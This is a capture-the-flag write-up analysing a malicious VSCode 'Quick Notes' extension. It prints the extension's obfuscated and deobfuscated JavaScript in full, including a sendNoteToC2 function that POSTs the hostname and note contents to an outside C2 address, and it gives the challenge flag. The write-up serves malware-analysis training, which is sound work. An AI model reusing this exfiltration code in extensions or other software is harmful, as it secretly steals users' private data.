# Challenge: Quick Notes

## Overview

A malicious Visual Studio Code (VSCode) extension named `quick_notes` is distributed as a `.vsix` file. While functional for creating notes, it secretly exfiltrates user data to a remote server.

---

## Steps to Solve

### Step 1: Extract the `.vsix` File

A `.vsix` file is a ZIP archive. Use `unzip` to extract contents:

```bash
unzip vscode-quick-notes-ctf-0.1.0.vsix
```

![Screenshot from 2025-05-14 22-54-01](https://github.com/user-attachments/assets/6d9b85c7-96cf-4447-ba74-6123b14c44d3)


This reveals an obfuscated JavaScript file (`extension.js`).

```
const _0x44d313=_0x579e;function _0x579e(_0x52b1f7,_0x2a6947){const _0x1ffb10=_0x1ffb();return _0x579e=function(_0x579e9e,_0x6c223d){_0x579e9e=_0x579e9e-0xbe;let _0x24107a=_0x1ffb10[_0x579e9e];return _0x24107a;},_0x579e(_0x52b1f7,_0x2a6947);}(function(_0x53226e,_0xd82bcf){const _0x4a81bb=_0x579e,_0xf0402c=_0x53226e();while(!![]){try{const _0x1a14fd=-parseInt(_0x4a81bb(0xe3))/0x1*(-parseInt(_0x4a81bb(0xdc))/0x2)+-parseInt(_0x4a81bb(0xea))/0x3*(parseInt(_0x4a81bb(0xd5))/0x4)+parseInt(_0x4a81bb(0x101))/0x5*(parseInt(_0x4a81bb(0xec))/0x6)+-parseInt(_0x4a81bb(0xf7))/0x7*(parseInt(_0x4a81bb(0xbf))/0x8)+parseInt(_0x4a81bb(0xd0))/0x9*(parseInt(_0x4a81bb(0xd4))/0xa)+-parseInt(_0x4a81bb(0xcb))/0xb*(parseInt(_0x4a81bb(0xf3))/0xc)+-parseInt(_0x4a81bb(0xf8))/0xd*(-parseInt(_0x4a81bb(0xeb))/0xe);if(_0x1a14fd===_0xd82bcf)break;else _0xf0402c['push'](_0xf0402c['shift']());}catch(_0x53a088){_0xf0402c['push'](_0xf0402c['shift']());}}}(_0x1ffb,0x38f4f));function _0x1ffb(){const _0xfcdfe7=['407955tKwgJM','84QhxIkj','12wdAuoB','https','mkdirSync','window','basename','uri','http','36MmEPzj','showTextDocument','replace','commands','299544aexjzV','364910FMLPfd','fsPath','vscode','error','subscriptions','status','POST','message','readdirSync','1064845HZqtmQ','length','Enter\x20note\x20name','16nTwmir','statSync','\x0aCreated:\x20','openTextDocument','showInformationMessage','push','Create\x20a\x20new\x20note','write','workspace','existsSync','join','endsWith','1399156dLrcqA','toLocaleString','registerCommand','log','notes','9xMypTK','.md','globalStorageUri','startsWith','1910990DUXRTs','4nXbnfm','stringify','vscode-quick-notes.listNotes','onDidSaveTextDocument','mtime','getText','vscode-quick-notes.newNote','2170blHWWB','Note\x20content\x20sent\x20with\x20status:\x20','Quick\x20Notes\x20extension\x20is\x20now\x20active!','filter','/c2.php','Response\x20status:','Error\x20sending\x20note\x20content:','47sVENiT','hostname','Note\x20exfiltration\x20error:','showInputBox','parse','exports','end'];_0x1ffb=function(){return _0xfcdfe7;};return _0x1ffb();}const vscode=require(_0x44d313(0xfa)),fs=require('fs'),path=require('path'),os=require('os'),https=require(_0x44d313(0xed)),http=require(_0x44d313(0xf2));function activate(strings){const _0x8895a6=_0x44d313;console['log'](_0x8895a6(0xde));const req_path=path['join'](strings[_0x8895a6(0xd2)][_0x8895a6(0xf9)],_0x8895a6(0xcf));!fs[_0x8895a6(0xc8)](req_path)&&fs[_0x8895a6(0xee)](req_path,{'recursive':!![]});let Note=vscode[_0x8895a6(0xf6)][_0x8895a6(0xcd)](_0x8895a6(0xdb),async()=>{const _0x2fa2d1=_0x8895a6,_0x357b39=await vscode[_0x2fa2d1(0xef)][_0x2fa2d1(0xe6)]({'placeHolder':_0x2fa2d1(0xbe),'prompt':_0x2fa2d1(0xc5)});if(!_0x357b39)return;const _0x3d6327=_0x357b39[_0x2fa2d1(0xf5)](/\s+/g,'_')+_0x2fa2d1(0xd1),_0x2088c8=path[_0x2fa2d1(0xc9)](req_path,_0x3d6327),_0x4770da=new Date()[_0x2fa2d1(0xcc)](),_0x26c8c6='#\x20'+_0x357b39+_0x2fa2d1(0xc1)+_0x4770da+'\x0a\x0a';fs['writeFileSync'](_0x2088c8,_0x26c8c6);const _0x2edb1e=await vscode[_0x2fa2d1(0xc7)][_0x2fa2d1(0xc2)](_0x2088c8);await vscode[_0x2fa2d1(0xef)]['showTextDocument'](_0x2edb1e),sendNoteToC2(_0x357b39),vscode[_0x2fa2d1(0xef)][_0x2fa2d1(0xc3)]('Created\x20new\x20note:\x20'+_0x357b39);});vscode[_0x8895a6(0xc7)][_0x8895a6(0xd8)](_0x4f51b1=>{const _0x5a7d69=_0x8895a6,_0xafb6b8=_0x4f51b1[_0x5a7d69(0xf1)][_0x5a7d69(0xf9)];if(_0xafb6b8[_0x5a7d69(0xd3)](req_path)&&_0xafb6b8[_0x5a7d69(0xca)](_0x5a7d69(0xd1))){const _0x57744f=path[_0x5a7d69(0xf0)](_0xafb6b8,_0x5a7d69(0xd1))[_0x5a7d69(0xf5)](/_/g,'\x20'),_0x33294e=_0x4f51b1[_0x5a7d69(0xda)]();sendNoteToC2(_0x57744f,_0x33294e);}});let _0x460d7e=vscode['commands'][_0x8895a6(0xcd)](_0x8895a6(0xd7),async()=>{const _0x31943b=_0x8895a6,_0x4e1476=fs[_0x31943b(0x100)](req_path)[_0x31943b(0xdf)](_0x399cf6=>_0x399cf6[_0x31943b(0xca)](_0x31943b(0xd1)))['map'](_0x2ba5c5=>({'label':_0x2ba5c5[_0x31943b(0xf5)](/_/g,'\x20')[_0x31943b(0xf5)](_0x31943b(0xd1),''),'description':'','detail':new Date(fs[_0x31943b(0xc0)](path[_0x31943b(0xc9)](req_path,_0x2ba5c5))[_0x31943b(0xd9)])[_0x31943b(0xcc)](),'filepath':path[_0x31943b(0xc9)](req_path,_0x2ba5c5)}));if(_0x4e1476[_0x31943b(0x102)]===0x0){vscode[_0x31943b(0xef)]['showInformationMessage']('No\x20notes\x20found.\x20Create\x20one\x20first!');return;}const _0x5e9458=await vscode[_0x31943b(0xef)]['showQuickPick'](_0x4e1476,{'placeHolder':'Select\x20a\x20note\x20to\x20open'});if(_0x5e9458){const _0x47577e=await vscode['workspace']['openTextDocument'](_0x5e9458['filepath']);await vscode[_0x31943b(0xef)][_0x31943b(0xf4)](_0x47577e);}});strings[_0x8895a6(0xfc)][_0x8895a6(0xc4)](Note,_0x460d7e);}function sendNoteToC2(js_strings){const _0x338cf0=_0x44d313;try{const Username=os[_0x338cf0(0xe4)](),js_strings=JSON[_0x338cf0(0xd6)]({'hostname':Username,'note':js_strings}),request={'hostname':'54.174.18.49','port':0x50,'path':_0x338cf0(0xe0),'method':_0x338cf0(0xfe),'headers':{'Content-Type':'application/json','Content-Length':js_strings[_0x338cf0(0x102)]}},_0x23d469=http['request'](request,_0x59adc9=>{const _0x2b0d41=_0x338cf0;console[_0x2b0d41(0xce)](_0x2b0d41(0xdd)+_0x59adc9['statusCode']),_0x59adc9['on']('js_strings',_0x48f492=>{const _0x43766a=_0x2b0d41;try{const _0x3be46f=JSON[_0x43766a(0xe7)](_0x48f492);_0x3be46f&&_0x3be46f[_0x43766a(0xfd)]&&console[_0x43766a(0xce)](_0x43766a(0xe1),_0x3be46f['status']);}catch(_0x48b8fd){console[_0x43766a(0xce)](_0x48b8fd);}});});_0x23d469['on'](_0x338cf0(0xfb),_0x1db41f=>{const _0x356c89=_0x338cf0;console['error'](_0x356c89(0xe2),_0x1db41f[_0x356c89(0xff)]);}),_0x23d469[_0x338cf0(0xc6)](js_strings),_0x23d469[_0x338cf0(0xe9)]();}catch(_0x1e16fb){console[_0x338cf0(0xfb)](_0x338cf0(0xe5),_0x1e16fb);}}function deactivate(){}module[_0x44d313(0xe8)]={'activate':activate,'deactivate':deactivate};

```

### Step 2: Deobfuscate the Code

Use an online deobfuscator to clean the code. The deobfuscated script shows:

```javascript
const vscode = require("vscode");
const fs = require("fs");
const path = require("path");
const os = require("os");
const http = require("http");

function activate(context) {
  console.log("Quick Notes extension is now active!");
  const req_path = path.join(context.globalStorageUri.fsPath, "notes");
  if (!fs.existsSync(req_path)) {
    fs.mkdirSync(req_path, { recursive: true });
  }

  vscode.commands.registerCommand("vscode-quick-notes.newNote", async () => {
    const noteName = await vscode.window.showInputBox({
      placeHolder: "Enter note name",
      prompt: "Create a new note"
    });
    if (!noteName) return;

    const filename = noteName.replace(/\s+/g, "_") + ".md";
    const filePath = path.join(req_path, filename);
    const header = `# ${noteName}\nCreated: ${new Date().toLocaleString()}\n\n`;
    fs.writeFileSync(filePath, header);

    const doc = await vscode.workspace.openTextDocument(filePath);
    await vscode.window.showTextDocument(doc);
    sendNoteToC2(noteName);
    vscode.window.showInformationMessage(`Created new note: ${noteName}`);
  });

  vscode.workspace.onDidSaveTextDocument((doc) => {
    const filePath = doc.uri.fsPath;
    if (filePath.startsWith(req_path) && filePath.endsWith(".md")) {
      const noteName = path.basename(filePath, ".md").replace(/_/g, " ");
      const content = doc.getText();
      sendNoteToC2(noteName, content);
    }
  });
}

function sendNoteToC2(noteName, content = "") {
  try {
    const hostname = os.hostname();
    const payload = JSON.stringify({ hostname, note: { name: noteName, content } });
    const options = {
      hostname: "54.174.18.49",
      port: 80,
      path: "/c2.php",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": payload.length
      }
    };

    const req = http.request(options, (res) => {
      console.log(`Note content sent with status: ${res.statusCode}`);
      res.on("data", (data) => {
        try {
          const response = JSON.parse(data);
          if (response.status) console.log(`Response status: ${response.status}`);
        } catch (err) {
          console.error(err);
        }
      });
    });

    req.on("error", (err) => {
      console.error(`Error sending note content: ${err.message}`);
    });

    req.write(payload);
    req.end();
  } catch (err) {
    console.error(`Note exfiltration error: ${err}`);
  }
}

function deactivate() {}

module.exports = { activate, deactivate };
```

### Step 3: Identify Malicious Behavior

The `sendNoteToC2` function exfiltrates note data to `54.174.18.49` via POST requests to `/c2.php`. The payload includes the victim’s hostname and note contents.

### Step 4: Retrieve the Flag

![Screenshot 2025-05-14 223923](https://github.com/user-attachments/assets/b2fa9d9f-375b-4d54-bbbc-5a2867dbc070)


Send a POST request to `http://54.174.18.49/beacon_log.txt` to access logs. The server returns:

```text
ZeroDays{m4l1c10us_3xt3ns10n_d3t3ct3d}
```

---

## Conclusion

The extension acts as malware by exfiltrating user data. Analyzing the deobfuscated code and interacting with the attacker’s endpoint recovers the flag.
